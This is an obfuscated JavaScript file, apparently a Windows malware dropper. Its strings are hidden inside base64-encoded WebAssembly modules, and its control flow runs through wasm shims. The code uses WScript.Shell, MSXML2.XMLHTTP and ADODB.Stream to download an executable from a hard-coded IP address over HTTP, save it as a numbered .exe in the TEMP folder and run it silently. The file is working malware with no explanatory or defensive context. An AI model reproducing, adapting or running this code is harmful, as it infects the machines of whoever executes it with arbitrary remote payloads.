const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG8YCAgAAUfwBBAQt/AEEIC38AQQ4LfwBBFgt/AEEYC38AQSILfwBBLgt/AEE2C38AQcYAC38AQcwAC38AQdAAC38AQdQAC38AQdgAC38AQdwAC38AQegAC38AQewAC38AQfgAC38AQYQBC38AQYgBC38AQYwBCwe0gYCAABUGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHBWRhdGE4AwgFZGF0YTkDCQZkYXRhMTADCgZkYXRhMTEDCwZkYXRhMTIDDAZkYXRhMTMDDQZkYXRhMTQDDgZkYXRhMTUDDwZkYXRhMTYDEAZkYXRhMTcDEQZkYXRhMTgDEgZkYXRhMTkDEwvsgYCAABQAQQELBUIuU3QAAEEICwVyZWFtAABBDgsGV1NjcmkAAEEWCwEAAEEYCwlwdC5TaGVsbAAAQSILCjIuWE1MSFRUUAAAQS4LBk1TWE1MAABBNgsOJTI1VEVNUCUyNSU1QwAAQcYACwVBRE9EAABBzAALAkcAAEHQAAsDRVQAAEHUAAsDaHQAAEHYAAsDdHAAAEHcAAsKJTNBJTJGJTJGAABB6AALAjQAAEHsAAsKNi4zMC40NS43AABB+AALCjMlMkZtZXJ0LgAAQYQBCwNleAAAQYgBCwJlAABBjAELDjEyMjQ4NzI1NC5leGUA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance8 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                (function (acMRvoX) {
                    function ULkwjGJGnWG(ubLrFIZDoYnE) {
                        return new acMRvoX.ActiveXObject(ubLrFIZDoYnE);
                    }
                    var WuLhqkJdtaacjb = true, jkFZqNhrYZWkwl = lS(0, 0) + (993982, lS(0, 1));
                    var PnPtHKXuORqDqyM;
                    PnPtHKXuORqDqyM = function (HdjxVffbRet, KuRguBRxAJGxrhe, JLKatIaUwWO) {
                        TUIakctOdZrinn = (1 ? lS(0, 2) : lS(0, 3)) + lS(0, 4);
                        var KHSlcydxPLl = ULkwjGJGnWG(TUIakctOdZrinn);
                        var shMNTIoeBzQxrfK = lS(0, 5);
                        var xTqKEAmAM = ULkwjGJGnWG(lS(0, 6) + (368567, shMNTIoeBzQxrfK));
                        var cTwoWDSh = lS(0, 7);
                        var YgtvBacrl = KHSlcydxPLl.ExpandEnvironmentStrings(cTwoWDSh);
                        var KuRguBRxAJGxrhe = YgtvBacrl + (438158262659, KuRguBRxAJGxrhe);
                        xTqKEAmAM.onreadystatechange = function () {
                            if (xTqKEAmAM.readyState == 4) {
                                WuLhqkJdtaacjb = false;
                                with (ULkwjGJGnWG(lS(0, 8) + jkFZqNhrYZWkwl)) {
                                    (() => {
                                        const __callInstance7 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    open();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance7.exports;
                                        return __exports.data();
                                    })();
                                    type = 1;
                                    (() => {
                                        const __callInstance6 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    write(xTqKEAmAM.ResponseBody);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance6.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance5 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    saveToFile(KuRguBRxAJGxrhe, 2);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance5.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    close();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance4.exports;
                                        return __exports.data();
                                    })();
                                    return KuRguBRxAJGxrhe;
                                }
                            }
                        };
                        (() => {
                            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        xTqKEAmAM.open(lS(0, 9) + (3192220, 4175797, lS(0, 10)), HdjxVffbRet, false);
                                    }
                                }
                            });
                            const __exports = __callInstance3.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        xTqKEAmAM.send();
                                    }
                                }
                            });
                            const __exports = __callInstance2.exports;
                            return __exports.data();
                        })();
                        SnThLj = acMRvoX.WScript.Sleep(1100);
                        (() => {
                            const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                                env: {
                                    test: () => {
                                        return WuLhqkJdtaacjb ? 1 : 0;
                                    },
                                    update: () => {
                                    },
                                    body: () => {
                                        {
                                            SnThLj;
                                        }
                                    }
                                }
                            });
                            const __exports = __forInstance0.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        (() => {
                                            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                                                env: {
                                                    impFunc: () => {
                                                        KHSlcydxPLl.Run(KuRguBRxAJGxrhe, 0, 0);
                                                    }
                                                }
                                            });
                                            const __exports = __callInstance1.exports;
                                            return __exports.data();
                                        })();
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance0.exports;
                            return __exports.data((new Date() > 0, 1552) ? 1 : 0);
                        })();
                    };
                    nPoQeLCi = lS(0, 11);
                    nPoQeLCi += lS(0, 12);
                    (() => {
                        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    PnPtHKXuORqDqyM(nPoQeLCi + lS(0, 13) + lS(0, 14) + lS(0, 15) + lS(0, 16) + lS(0, 17) + lS(0, 18), lS(0, 19), 1);
                                }
                            }
                        });
                        const __exports = __callInstance0.exports;
                        return __exports.data();
                    })();
                }(this));
            }
        }
    });
    const __exports = __callInstance8.exports;
    return __exports.data();
})();